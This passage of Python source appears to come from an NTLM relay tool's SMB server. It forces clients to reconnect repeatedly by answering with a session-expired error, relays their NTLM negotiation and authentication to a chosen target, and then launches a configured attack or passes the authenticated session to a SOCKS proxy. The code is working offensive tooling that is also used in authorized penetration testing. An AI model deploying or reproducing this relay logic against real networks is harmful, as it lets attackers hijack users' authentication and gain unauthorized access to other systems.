        if treeConnectAndXParameters['Flags'] & 0x8:
            respParameters        = smb.SMBTreeConnectAndXExtendedResponse_Parameters()

        treeConnectAndXData                    = smb.SMBTreeConnectAndX_Data( flags = recvPacket['Flags2'] )
        treeConnectAndXData['_PasswordLength'] = treeConnectAndXParameters['PasswordLength']
        treeConnectAndXData.fromString(SMBCommand['Data'])

        ## Process here the request, does the share exist?
        UNCOrShare = decodeSMBString(recvPacket['Flags2'], treeConnectAndXData['Path'])

        # Is this a UNC?
        if ntpath.ismount(UNCOrShare):
            path = UNCOrShare.split('\\')[3]
        else:
            path = ntpath.basename(UNCOrShare)

        # This is the key, force the client to reconnect.
        # It will loop until all targets are processed for this user
        errorCode = STATUS_NETWORK_SESSION_EXPIRED
        resp['ErrorCode'] = errorCode >> 16
        resp['_reserved'] = 0o3
        resp['ErrorClass'] = errorCode & 0xff

        if path == 'IPC$':
            respData['Service']               = 'IPC'
        else:
            respData['Service']               = path
        respData['PadLen']                = 0
        respData['NativeFileSystem']      = encodeSMBString(recvPacket['Flags2'], 'NTFS' )

        respSMBCommand['Parameters']             = respParameters
        respSMBCommand['Data']                   = respData

        resp['Uid'] = connData['Uid']
        resp.addCommand(respSMBCommand)
        smbServer.setConnectionData(connId, connData)

        return None, [resp], errorCode
    ################################################################################

    #Initialize the correct client for the relay target
    def init_client(self,extSec):
        if self.target.scheme.upper() in self.config.protocolClients:
            client = self.config.protocolClients[self.target.scheme.upper()](self.config, self.target, extendedSecurity = extSec)
            client.initConnection()
        else:
            raise Exception('Protocol Client for %s not found!' % self.target.scheme)


        return client

    def do_ntlm_negotiate(self,client,token):
        #Since the clients all support the same operations there is no target protocol specific code needed for now
        return client.sendNegotiate(token)

    def do_ntlm_auth(self,client,SPNEGO_token,challenge):
        #The NTLM blob is packed in a SPNEGO packet, extract it for methods other than SMB
        clientResponse, errorCode = client.sendAuth(SPNEGO_token, challenge)

        return clientResponse, errorCode

    def do_attack(self,client):
        #Do attack. Note that unlike the HTTP server, the config entries are stored in the current object and not in any of its properties
        # Check if SOCKS is enabled and if we support the target scheme
        if self.config.runSocks and self.target.scheme.upper() in self.config.socksServer.supportedSchemes:
            if self.config.runSocks is True:
                # Pass all the data to the socksplugins proxy
                activeConnections.put((self.target.hostname, client.targetPort, self.target.scheme.upper(),
                                       self.authUser, client, client.sessionData))
                return

        # If SOCKS is not enabled, or not supported for this scheme, fall back to "classic" attacks
        if self.target.scheme.upper() in self.config.attacks:
            # We have an attack.. go for it
            clientThread = self.config.attacks[self.target.scheme.upper()](self.config, client.session, self.authUser)
            clientThread.start()
        else:
            LOG.error('No attack configured for %s' % self.target.scheme.upper())

    def _start(self):
        self.server.daemon_threads=True
        self.server.serve_forever()
        LOG.info('Shutting down SMB Server')
        self.server.server_close()

    def run(self):
        LOG.info("Setting up SMB Server")
        self._start()

